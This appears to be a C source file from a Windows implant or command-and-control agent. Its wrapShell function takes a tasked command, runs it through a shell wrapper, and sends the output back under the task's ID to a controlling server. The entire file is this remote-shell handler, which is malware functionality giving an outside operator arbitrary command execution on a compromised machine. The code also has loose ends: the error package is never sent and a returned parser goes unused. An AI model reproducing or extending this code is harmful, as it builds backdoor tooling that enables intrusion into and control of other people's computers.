#include <windows.h>
#include "BaseShell.h"
#include "WrapShell.h"

BOOL wrapShell(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);
    UINT32 nbArg = getInt32(arguments);
    SIZE_T size = 0;
    PCHAR cmd = getString(arguments, &size);

    // Reallocate memory for cmd without using C/C++ standard libraries
    cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);

    // Create a response package
    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    // Create an output package
    PPackage output = newPackage(0, FALSE);
    
    // Initialize result buffer
    #define MAX_RESULT_SIZE 4096
    char result[MAX_RESULT_SIZE];
    result[0] = '\0'; // Initialize the result string

    // Execute the Shell command
    BOOL success = baseShell(cmd, result, MAX_RESULT_SIZE);

    if (!success)
    {
        // Define an error message without using std::string
        char errorMsg[256];
        errorMsg[0] = '\0'; // Initialize the error message

        // Construct the error message manually
        CustomStrCopy(errorMsg, "[SHELL] Error executing command: ", sizeof(errorMsg));
        CustomStrCat(errorMsg, cmd, sizeof(errorMsg));
        CustomStrCat(errorMsg, "!\n", sizeof(errorMsg));

        // Add the error message to the output package
        addString(output, errorMsg, FALSE);
    }
    else
    {
        // Add the result to the output package without using std::string
        addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
    }

    // Send the output package
    Parser* ResponseParser = sendPackage(responseTask);

    // Clean up
    LocalFree(cmd);

    return success;
}